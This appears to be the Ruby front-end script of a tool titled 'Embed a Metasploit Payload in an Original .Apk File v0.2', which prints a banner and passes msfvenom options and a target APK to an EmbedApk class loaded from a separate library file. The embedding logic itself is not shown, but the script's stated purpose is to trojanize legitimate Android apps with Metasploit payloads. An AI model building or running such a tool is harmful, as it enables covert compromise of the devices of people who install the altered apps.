#!/usr/bin/env ruby
# encoding: utf-8

load "lib/embed-payload.rb"

require 'nokogiri'
require 'fileutils'
require 'optparse'
require 'colorize'
require 'securerandom'

puts "
██╗  ██╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ███████╗
╚██╗██╔╝██╔════╝██╔═████╗██╔══██╗╚════██╗██╔══██╗╚══███╔╝
 ╚███╔╝ ██║     ██║██╔██║██║  ██║ █████╔╝██████╔╝  ███╔╝ 
 ██╔██╗ ██║     ████╔╝██║██║  ██║ ╚═══██╗██╔══██╗ ███╔╝  
██╔╝ ██╗╚██████╗╚██████╔╝██████╔╝██████╔╝██║  ██║███████╗
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝                                  
".cyan

puts "Embed a Metasploit Payload in an Original .Apk File v0.2".green

msfvenom_opts = ARGV[1,ARGV.length]
	opts=""
	msfvenom_opts.each{|x|
	opts+=x
	opts+=" "
	}

EmbedPayload = EmbedApk.new(
	Dir.pwd + "/",
    "/tmp/",
	ARGV[0],
	"Tools/",
	opts
	)
